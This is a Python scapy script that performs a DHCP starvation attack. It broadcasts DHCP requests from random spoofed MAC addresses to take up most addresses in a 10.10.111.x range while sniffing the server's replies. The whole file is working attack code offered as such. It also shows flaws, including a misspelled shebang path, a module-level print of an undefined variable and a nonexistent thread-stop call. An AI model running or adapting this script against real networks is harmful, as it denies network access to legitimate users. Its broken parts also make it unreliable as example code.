#!/user/bin/env python
from scapy.all import*
import sys
import time
from threading import Thread

ip_addr=[""]
mac=[""]

def main():
    thread = Thread(target=sniffer)
    thread.start()
    while len(ip_addr)<100:attack()
    if(thread.isAlive()):thread._thread_stop()
    quit()

def sniffer():
    sniff(filter="udp and (port 67 or port 68)", prn=checkdhcp, store=0)

def checkdhcp(pkt):
    global ip_addr
    if pkt[DHCP]:
        if pkt[DHCP].options[0][1]==5 and pkt[IP].dst!="10.10.111.107":
            ip_addr.append(pkt[IP].dst)

def attack():
    global mac
    counter=100
    ip='10.10.111.'
    
    for counter in range(100,201):
        if counter==101:continue
        
        hw=""
        while hw in mac:
            hw=RandMAC();
        mac.append(hw)
        temp=str(counter)
        req_ip=ip+temp
        if req_ip in ip_addr:continue
        
        dhcp_request = Ether(src=hw,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","request"),("requested_addr",req_ip),"end"])
        sendp(dhcp_request)
        counter=counter+1
        time.sleep(0.2)
print ("counter=",counter)

if __name__=='__main__':
    main()

